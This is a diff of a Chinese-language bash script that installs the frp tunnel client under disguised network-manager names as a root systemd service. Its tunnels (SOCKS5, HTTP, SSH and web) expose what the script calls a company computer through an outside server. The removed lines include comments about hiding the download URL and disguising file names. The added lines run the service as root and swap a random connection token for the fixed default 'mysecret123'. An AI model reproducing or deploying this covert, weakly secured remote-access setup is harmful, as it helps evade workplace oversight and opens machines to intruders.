@@ -18,7 +18,7 @@ TOOL_VERSION=0.62.1
 INSTALL_DIR=/usr/share/network-manager/plugins
 SERVICE_NAME=nm-plugin-service
 SERVICE_FILE=/etc/systemd/system/${SERVICE_NAME}.service
-CONFIG_FILE=$INSTALL_DIR/nm-settings.yaml
+CONFIG_FILE=$INSTALL_DIR/nm-settings.ini
 REAL_BINARY=nm-connection-helper
 
 # 获取本机信息
@@ -78,33 +78,26 @@ list_tunnels() {
     echo -e "${BLUE}当前配置的网络通道:${NC}"
     echo -e "${YELLOW}================================${NC}"
     
-    # 使用yq工具来解析YAML（需要安装yq）
-    # 检查是否安装了yq
-    if ! command -v yq &> /dev/null; then
-        echo -e "${RED}未找到yq工具，无法解析配置。请安装yq: sudo apt install yq${NC}"
-        return 1
-    fi
-    
-    # 提取服务器信息
-    SERVER_ADDR=$(yq eval '.common.server_addr' "$CONFIG_FILE")
-    SERVER_PORT=$(yq eval '.common.server_port' "$CONFIG_FILE")
+    # 从配置文件中提取服务器信息
+    SERVER_ADDR=$(grep "server_addr" "$CONFIG_FILE" | head -1 | cut -d'=' -f2 | tr -d ' ')
+    SERVER_PORT=$(grep "server_port" "$CONFIG_FILE" | head -1 | cut -d'=' -f2 | tr -d ' ')
     
     echo -e "${GREEN}连接服务器:${NC} $SERVER_ADDR:$SERVER_PORT"
     echo -e "${YELLOW}================================${NC}"
     
     # 获取所有代理（排除common部分）
-    PROXIES=$(yq eval 'keys | .[] | select(. != "common")' "$CONFIG_FILE")
+    SECTIONS=$(grep -E "^\[.+\]" "$CONFIG_FILE" | grep -v "\[common\]" | tr -d '[]')
     
-    if [ -z "$PROXIES" ]; then
+    if [ -z "$SECTIONS" ]; then
         echo -e "${RED}没有配置任何网络通道。${NC}"
         return 1
     fi
     
     section_count=0
-    for proxy in $PROXIES; do
-        echo -e "${GREEN}$proxy${NC}"
-        local_port=$(yq eval ".$proxy.local_port" "$CONFIG_FILE")
-        remote_port=$(yq eval ".$proxy.remote_port" "$CONFIG_FILE")
+    for section in $SECTIONS; do
+        echo -e "${GREEN}$section${NC}"
+        local_port=$(grep -A5 "^\[$section\]" "$CONFIG_FILE" | grep "local_port" | head -1 | cut -d'=' -f2 | tr -d ' ')
+        remote_port=$(grep -A5 "^\[$section\]" "$CONFIG_FILE" | grep "remote_port" | head -1 | cut -d'=' -f2 | tr -d ' ')
         echo -e "  本地端口: ${local_port}"
         echo -e "  远程端口: ${remote_port}"
         echo -e "  远程访问地址: ${SERVER_ADDR}:${remote_port}"
@@ -120,124 +113,50 @@ list_tunnels() {
     return 0
 }
 
-# 下载客户端
-download_with_proxy() {
-    echo -e "${BLUE}正在下载系统网络组件 ${TOOL_VERSION}...${NC}"
+# 直接从GitHub下载二进制文件
+download_binary_direct() {
+    echo -e "${BLUE}正在直接下载FRP客户端二进制文件...${NC}"
     cd /tmp
     
-    # 隐藏真实下载URL
-    REAL_DOWNLOAD_URL="https://github.com/fatedier/frp/releases/download/v${TOOL_VERSION}/frp_${TOOL_VERSION}_linux_amd64.tar.gz"
-    DOWNLOAD_FILENAME="netmgr_${TOOL_VERSION}_linux.tar.gz"
+    # 二进制文件的下载URL
+    BINARY_URL="https://github.com/fatedier/frp/releases/download/v${TOOL_VERSION}/frpc_${TOOL_VERSION}_linux_amd64"
+    BINARY_FILENAME="frpc_temp"
     
-    # 询问是否使用代理，默认否
-    read -p "是否使用代理下载？(y/N): " use_proxy
-    if [[ "$use_proxy" == "y" || "$use_proxy" == "Y" ]]; then
-        read -p "请输入代理地址和端口 (格式: ip:port): " proxy_address
-        
-        echo -e "${YELLOW}使用代理下载: ${proxy_address}${NC}"
-        curl -L -o "$DOWNLOAD_FILENAME" --proxy http://${proxy_address} "$REAL_DOWNLOAD_URL" || {
-            echo -e "${RED}代理下载失败，请检查代理设置或尝试直接下载。${NC}"
-            return 1
-        }
-    else
-        echo -e "${YELLOW}尝试直接下载...${NC}"
-        curl -L -o "$DOWNLOAD_FILENAME" "$REAL_DOWNLOAD_URL" || {
-            echo -e "${RED}直接下载失败，建议使用代理。${NC}"
-            return 1
-        }
-    fi
-    
-    # 检查文件是否成功下载和有效
-    if [ ! -f "$DOWNLOAD_FILENAME" ] || [ ! -s "$DOWNLOAD_FILENAME" ]; then
-        echo -e "${RED}下载的文件不存在或为空！${NC}"
-        return 1
-    fi
-    
-    return 0
-}
-
-# 使用多个镜像站点自动下载，并验证文件有效性
-download_from_mirrors() {
-    echo -e "${BLUE}正在下载系统网络组件 ${TOOL_VERSION}...${NC}"
-    cd /tmp
-    
-    # 伪装下载文件名
-    DOWNLOAD_FILENAME="netmgr_${TOOL_VERSION}_linux.tar.gz"
-    
-    # 精选几个最稳定的镜像站点
-    MIRROR_URLS=(
-        # GitHack镜像
-        "https://raw.githack.com/fatedier/frp/v${TOOL_VERSION}/release/packages/frp_${TOOL_VERSION}_linux_amd64.tar.gz"
-        # Jsdelivr CDN
-        "https://cdn.jsdelivr.net/gh/fatedier/frp@v${TOOL_VERSION}/release/packages/frp_${TOOL_VERSION}_linux_amd64.tar.gz"
-        # Gitee镜像（需要在Gitee上有对应的镜像仓库）
-        "https://gitee.com/mirrors/frp/raw/v${TOOL_VERSION}/release/packages/frp_${TOOL_VERSION}_linux_amd64.tar.gz"
-        # cloudflare的GitHub代理
-        "https://gh.api.99988866.xyz/https://github.com/fatedier/frp/releases/download/v${TOOL_VERSION}/frp_${TOOL_VERSION}_linux_amd64.tar.gz"
-        # fastgit镜像
-        "https://download.fastgit.org/fatedier/frp/releases/download/v${TOOL_VERSION}/frp_${TOOL_VERSION}_linux_amd64.tar.gz"
-    )
-    
-    # GitHub直接下载URL（最后尝试）
-    DIRECT_URL="https://github.com/fatedier/frp/releases/download/v${TOOL_VERSION}/frp_${TOOL_VERSION}_linux_amd64.tar.gz"
-    
-    echo -e "${YELLOW}开始自动从镜像站点下载，请稍候...${NC}"
-    
-    # 尝试从每个镜像下载，直到成功
-    for mirror_url in "${MIRROR_URLS[@]}"; do
-        echo -e "${BLUE}尝试从镜像站点下载...${NC}"
-        if curl -L -o "$DOWNLOAD_FILENAME" --connect-timeout 10 --max-time 120 "$mirror_url"; then
-            if [ -s "$DOWNLOAD_FILENAME" ]; then
-                # 验证下载的文件是否为有效的tar.gz文件
-                if file "$DOWNLOAD_FILENAME" | grep -q "gzip compressed data"; then
-                    echo -e "${GREEN}下载成功并验证为有效的压缩文件！${NC}"
-                    return 0
-                else
-                    echo -e "${YELLOW}下载的文件不是有效的gzip文件，尝试下一个镜像...${NC}"
-                    rm -f "$DOWNLOAD_FILENAME"
-                fi
-            else
-                echo -e "${YELLOW}下载文件为空，尝试下一个镜像...${NC}"
-                rm -f "$DOWNLOAD_FILENAME"
-            fi
-        else
-            echo -e "${YELLOW}镜像下载失败，尝试下一个镜像...${NC}"
-        fi
-    done
-    
-    # 最后尝试直接从GitHub下载
-    echo -e "${YELLOW}所有镜像下载失败，尝试直接从GitHub下载...${NC}"
-    if curl -L -o "$DOWNLOAD_FILENAME" --connect-timeout 15 --max-time 300 "$DIRECT_URL"; then
-        if [ -s "$DOWNLOAD_FILENAME" ] && file "$DOWNLOAD_FILENAME" | grep -q "gzip compressed data"; then
-            echo -e "${GREEN}从GitHub下载成功！${NC}"
+    # 尝试直接下载
+    echo -e "${YELLOW}尝试直接下载...${NC}"
+    if curl -L -o "$BINARY_FILENAME" --connect-timeout 15 --max-time 300 "$BINARY_URL"; then
+        if [ -s "$BINARY_FILENAME" ]; then
+            echo -e "${GREEN}直接下载成功！${NC}"
+            # 确保可执行
+            chmod +x "$BINARY_FILENAME"
+            # 移动到安装目录
+            mkdir -p "$INSTALL_DIR"
+            mv "$BINARY_FILENAME" "$INSTALL_DIR/$REAL_BINARY"
             return 0
         else
-            echo -e "${RED}从GitHub下载的文件无效！${NC}"
-            rm -f "$DOWNLOAD_FILENAME"
+            echo -e "${RED}下载的文件为空！${NC}"
+            rm -f "$BINARY_FILENAME"
         fi
     else
-        echo -e "${RED}所有下载方式均失败！${NC}"
+        echo -e "${RED}直接下载失败，建议使用代理。${NC}"
     fi
     
-    # 当所有自动下载方式都失败后，提供备选方案
-    echo -e "${RED}无法自动下载，提供以下备选方案：${NC}"
-    echo -e "${YELLOW}1. 使用手动下载方式:${NC}"
-    echo -e "   ${YELLOW}下载链接: ${DIRECT_URL}${NC}"
-    echo -e "   ${YELLOW}下载后，将文件重命名为 ${DOWNLOAD_FILENAME} 并放置在 /tmp 目录下，然后重新运行此脚本。${NC}"
-    echo -e "${YELLOW}2. 使用代理下载:${NC}"
-    
-    # 尝试使用代理下载
-    read -p "是否尝试使用代理下载? (y/n): " use_proxy
-    if [[ "$use_proxy" == "y" || "$use_proxy" == "Y" ]]; then
-        read -p "请输入代理地址和端口 (格式: ip:port): " proxy_address
+    # 如果直接下载失败，尝试使用代理
+    read -p "请输入代理地址和端口 (格式: ip:port): " proxy_address
+    if [ -n "$proxy_address" ]; then
         echo -e "${YELLOW}使用代理下载: ${proxy_address}${NC}"
-        if curl -L -o "$DOWNLOAD_FILENAME" --proxy http://${proxy_address} --connect-timeout 15 --max-time 300 "$DIRECT_URL"; then
-            if [ -s "$DOWNLOAD_FILENAME" ] && file "$DOWNLOAD_FILENAME" | grep -q "gzip compressed data"; then
+        if curl -L -o "$BINARY_FILENAME" --proxy http://${proxy_address} --connect-timeout 15 --max-time 300 "$BINARY_URL"; then
+            if [ -s "$BINARY_FILENAME" ]; then
                 echo -e "${GREEN}使用代理下载成功！${NC}"
+                # 确保可执行
+                chmod +x "$BINARY_FILENAME"
+                # 移动到安装目录
+                mkdir -p "$INSTALL_DIR"
+                mv "$BINARY_FILENAME" "$INSTALL_DIR/$REAL_BINARY"
                 return 0
             else
-                echo -e "${RED}使用代理下载的文件无效！${NC}"
-                rm -f "$DOWNLOAD_FILENAME"
+                echo -e "${RED}下载的文件为空！${NC}"
+                rm -f "$BINARY_FILENAME"
             fi
         else
             echo -e "${RED}代理下载失败！${NC}"
@@ -247,8 +166,6 @@ download_from_mirrors() {
     echo -e "${RED}所有下载方法均失败，请手动下载或检查网络连接。${NC}"
     return 1
 }
-
-
 
 # 安装客户端
 install_client() {
@@ -264,49 +181,13 @@ install_client() {
     # 创建安装目录
     mkdir -p $INSTALL_DIR
     
-    # 安装依赖
-    echo -e "${BLUE}检查是否安装了必要的依赖...${NC}"
-    if ! command -v yq &> /dev/null; then
-        echo -e "${YELLOW}未找到yq工具，尝试安装...${NC}"
-        apt-get update && apt-get install -y yq || {
-            echo -e "${RED}无法安装yq，请手动安装后重试。${NC}"
-            return 1
-        }
-    fi
-    
     # 如果是新安装，则下载并安装
     if [ ! -f "$INSTALL_DIR/$REAL_BINARY" ]; then
-        # 使用下载函数下载
-        if ! download_from_mirrors; then
+        # 直接下载二进制文件
+        if ! download_binary_direct; then
             echo -e "${RED}下载失败，请检查网络连接或代理设置。${NC}"
             return 1
         fi
-        
-        echo -e "${BLUE}正在安装网络组件...${NC}"
-        # 解压原始文件，并重命名为我们的伪装名称
-        DOWNLOAD_FILENAME="netmgr_${TOOL_VERSION}_linux.tar.gz"
-        TEMP_DIR="netmgr_temp"
-        mkdir -p "/tmp/$TEMP_DIR"
-        
-        tar -zxf "/tmp/$DOWNLOAD_FILENAME" -C "/tmp/$TEMP_DIR" || {
-            echo -e "${RED}解压失败，可能下载的文件不完整或已损坏。${NC}"
-            rm -rf "/tmp/$TEMP_DIR"
-            return 1
-        }
-        
-        # 查找真实的二进制文件并复制为我们的伪装名称
-        find "/tmp/$TEMP_DIR" -name "frpc" -exec cp {} "$INSTALL_DIR/$REAL_BINARY" \; || {
-            echo -e "${RED}复制文件失败。${NC}"
-            rm -rf "/tmp/$TEMP_DIR"
-            return 1
-        }
-        
-        # 确保可执行
-        chmod +x "$INSTALL_DIR/$REAL_BINARY"
-        
-        # 清理临时文件
-        rm -f "/tmp/$DOWNLOAD_FILENAME"
-        rm -rf "/tmp/$TEMP_DIR"
     fi
 
     # 获取本机主机名
@@ -316,15 +197,15 @@ install_client() {
     read -p "请输入服务端地址 (IP或域名): " VPS_IP
     read -p "请输入服务端口 [默认7000]: " SERVER_PORT
     SERVER_PORT=${SERVER_PORT:-7000}
-    read -p "请输入连接密钥 [默认随机生成]: " TOKEN
-    TOKEN=${TOKEN:-$(openssl rand -hex 16)}
+    read -p "请输入连接密钥 [默认mysecret123]: " TOKEN
+    TOKEN=${TOKEN:-mysecret123}
     
-    # 创建基本配置文件（YAML格式）
+    # 创建基本配置文件（INI格式）
     cat > $CONFIG_FILE <<EOF
-common:
-  server_addr: ${VPS_IP}
-  server_port: ${SERVER_PORT}
-  token: ${TOKEN}
+[common]
+server_addr = ${VPS_IP}
+server_port = ${SERVER_PORT}
+token = ${TOKEN}
 EOF
 
     # 配置 SOCKS5 代理通道，默认选择Y
@@ -334,11 +215,12 @@ EOF
         SOCKS_LOCAL_PORT=${SOCKS_LOCAL_PORT:-10811}
         SOCKS_REMOTE_PORT=$(get_random_port)
         cat >> $CONFIG_FILE <<EOF
-private-${HOSTNAME}:
-  type: tcp
-  local_ip: 127.0.0.1
-  local_port: ${SOCKS_LOCAL_PORT}
-  remote_port: ${SOCKS_REMOTE_PORT}
+
+[private-${HOSTNAME}]
+type = tcp
+local_ip = 127.0.0.1
+local_port = ${SOCKS_LOCAL_PORT}
+remote_port = ${SOCKS_REMOTE_PORT}
 EOF
     fi
     
@@ -349,11 +231,12 @@ EOF
         HTTP_LOCAL_PORT=${HTTP_LOCAL_PORT:-9000}
         HTTP_REMOTE_PORT=$(get_random_port)
         cat >> $CONFIG_FILE <<EOF
-public-${HOSTNAME}:
-  type: tcp
-  local_ip: 127.0.0.1
-  local_port: ${HTTP_LOCAL_PORT}
-  remote_port: ${HTTP_REMOTE_PORT}
+
+[public-${HOSTNAME}]
+type = tcp
+local_ip = 127.0.0.1
+local_port = ${HTTP_LOCAL_PORT}
+remote_port = ${HTTP_REMOTE_PORT}
 EOF
     fi
     
@@ -365,11 +248,12 @@ EOF
         SSH_REMOTE_PORT=$(get_random_port)
         
         cat >> $CONFIG_FILE <<EOF
-shell-${HOSTNAME}:
-  type: tcp
-  local_ip: 127.0.0.1
-  local_port: ${SSH_LOCAL_PORT}
-  remote_port: ${SSH_REMOTE_PORT}
+
+[shell-${HOSTNAME}]
+type = tcp
+local_ip = 127.0.0.1
+local_port = ${SSH_LOCAL_PORT}
+remote_port = ${SSH_REMOTE_PORT}
 EOF
     fi
     
@@ -381,11 +265,12 @@ EOF
         WEB_REMOTE_PORT=$(get_random_port)
         
         cat >> $CONFIG_FILE <<EOF
-webservice-${HOSTNAME}:
-  type: tcp
-  local_ip: 127.0.0.1
-  local_port: ${WEB_LOCAL_PORT}
-  remote_port: ${WEB_REMOTE_PORT}
+
+[webservice-${HOSTNAME}]
+type = tcp
+local_ip = 127.0.0.1
+local_port = ${WEB_LOCAL_PORT}
+remote_port = ${WEB_REMOTE_PORT}
 EOF
     fi
     
@@ -404,6 +289,7 @@ After=network.target
 
 [Service]
 Type=simple
+User=root
 ExecStart=${INSTALL_DIR}/${REAL_BINARY} -c ${CONFIG_FILE}
 Restart=always
 RestartSec=5
@@ -447,13 +333,14 @@ add_tunnel() {
         REMOTE_PORT=$(get_random_port)
     fi
     
-    # 添加到配置文件，加入主机名（YAML格式）
+    # 添加到配置文件，加入主机名（INI格式）
     cat >> $CONFIG_FILE <<EOF
-${TUNNEL_NAME}-${HOSTNAME}:
-  type: tcp
-  local_ip: 127.0.0.1
-  local_port: ${LOCAL_PORT}
-  remote_port: ${REMOTE_PORT}
+
+[${TUNNEL_NAME}-${HOSTNAME}]
+type = tcp
+local_ip = 127.0.0.1
+local_port = ${LOCAL_PORT}
+remote_port = ${REMOTE_PORT}
 EOF
 
     echo -e "${GREEN}✅ 已添加新的网络通道: ${TUNNEL_NAME}-${HOSTNAME}${NC}"
@@ -481,13 +368,43 @@ remove_tunnel() {
     read -p "请输入要删除的通道名称: " TUNNEL_NAME
     
     # 检查通道是否存在
-    if ! yq eval ".$TUNNEL_NAME" "$CONFIG_FILE" &>/dev/null; then
+    if ! grep -q "^\[$TUNNEL_NAME\]" "$CONFIG_FILE"; then
         echo -e "${RED}错误: 通道 '${TUNNEL_NAME}' 不存在。${NC}"
         return
     fi
     
-    # 使用yq删除指定的通道部分
-    yq eval "del(.$TUNNEL_NAME)" -i "$CONFIG_FILE"
+    # 临时文件
+    TEMP_FILE=$(mktemp)
+    
+    # 将[TUNNEL_NAME]小节删除
+    awk -v section="\[$TUNNEL_NAME\]" '
+    BEGIN { skip = 0; empty_line = 0; }
+    /^\[/ {
+        if ($0 ~ section) {
+            skip = 1;
+            empty_line = 1;  # 标记需要删除前面的空行
+        } else {
+            if (empty_line) {
+                # 如果之前标记了需要删除空行，但现在遇到了新的section，不输出空行
+                empty_line = 0;
+            }
+            skip = 0;
+            print;
+        }
+        next;
+    }
+    skip == 0 {
+        # 如果前一行标记了需要删除空行，且当前行是空行，则不输出
+        if (empty_line && $0 ~ /^$/) {
+            empty_line = 0;
+            next;
+        }
+        print;
+    }
+    ' "$CONFIG_FILE" > "$TEMP_FILE"
+    
+    # 替换原始文件
+    mv "$TEMP_FILE" "$CONFIG_FILE"
     
     echo -e "${GREEN}✅ 已删除网络通道: ${TUNNEL_NAME}${NC}"
     
@@ -526,9 +443,9 @@ show_usage() {
     echo -e "2. 在您的手机或其他设备上设置相应的代理:"
     
     # 如果找到 SOCKS5 配置，显示详细信息
-    if [ -f "$CONFIG_FILE" ] && yq eval '.["private-'$(get_hostname)'"]' "$CONFIG_FILE" &>/dev/null; then
-        SERVER_ADDR=$(yq eval '.common.server_addr' "$CONFIG_FILE")
-        SOCKS_REMOTE_PORT=$(yq eval '.["private-'$(get_hostname)'"].remote_port' "$CONFIG_FILE")
+    if [ -f "$CONFIG_FILE" ] && grep -q "^\[private-$(get_hostname)\]" "$CONFIG_FILE"; then
+        SERVER_ADDR=$(grep "server_addr" "$CONFIG_FILE" | head -1 | cut -d'=' -f2 | tr -d ' ')
+        SOCKS_REMOTE_PORT=$(grep -A5 "^\[private-$(get_hostname)\]" "$CONFIG_FILE" | grep "remote_port" | head -1 | cut -d'=' -f2 | tr -d ' ')
         echo -e "   - 安全通道 1 (SOCKS5):"
         echo -e "     服务器: ${SERVER_ADDR}"
         echo -e "     端口: ${SOCKS_REMOTE_PORT}"
@@ -537,9 +454,9 @@ show_usage() {
     fi
     
     # 如果找到 HTTP 配置，显示详细信息
-    if [ -f "$CONFIG_FILE" ] && yq eval '.["public-'$(get_hostname)'"]' "$CONFIG_FILE" &>/dev/null; then
-        SERVER_ADDR=$(yq eval '.common.server_addr' "$CONFIG_FILE")
-        HTTP_REMOTE_PORT=$(yq eval '.["public-'$(get_hostname)'"].remote_port' "$CONFIG_FILE")
+    if [ -f "$CONFIG_FILE" ] && grep -q "^\[public-$(get_hostname)\]" "$CONFIG_FILE"; then
+        SERVER_ADDR=$(grep "server_addr" "$CONFIG_FILE" | head -1 | cut -d'=' -f2 | tr -d ' ')
+        HTTP_REMOTE_PORT=$(grep -A5 "^\[public-$(get_hostname)\]" "$CONFIG_FILE" | grep "remote_port" | head -1 | cut -d'=' -f2 | tr -d ' ')
         echo -e "   - 安全通道 2 (HTTP):"
         echo -e "     服务器: ${SERVER_ADDR}"
         echo -e "     端口: ${HTTP_REMOTE_PORT}"
@@ -565,9 +482,9 @@ show_usage() {
     echo -e "${GREEN}【远程管理连接】${NC}"
     
     # 如果找到 SSH 配置，显示详细信息
-    if [ -f "$CONFIG_FILE" ] && yq eval '.["shell-'$(get_hostname)'"]' "$CONFIG_FILE" &>/dev/null; then
-        SERVER_ADDR=$(yq eval '.common.server_addr' "$CONFIG_FILE")
-        SSH_REMOTE_PORT=$(yq eval '.["shell-'$(get_hostname)'"].remote_port' "$CONFIG_FILE")
+    if [ -f "$CONFIG_FILE" ] && grep -q "^\[shell-$(get_hostname)\]" "$CONFIG_FILE"; then
+        SERVER_ADDR=$(grep "server_addr" "$CONFIG_FILE" | head -1 | cut -d'=' -f2 | tr -d ' ')
+        SSH_REMOTE_PORT=$(grep -A5 "^\[shell-$(get_hostname)\]" "$CONFIG_FILE" | grep "remote_port" | head -1 | cut -d'=' -f2 | tr -d ' ')
         echo -e "使用以下命令连接到您的公司电脑:"
         echo -e "  ssh -p ${SSH_REMOTE_PORT} 用户名@${SERVER_ADDR}"
     else
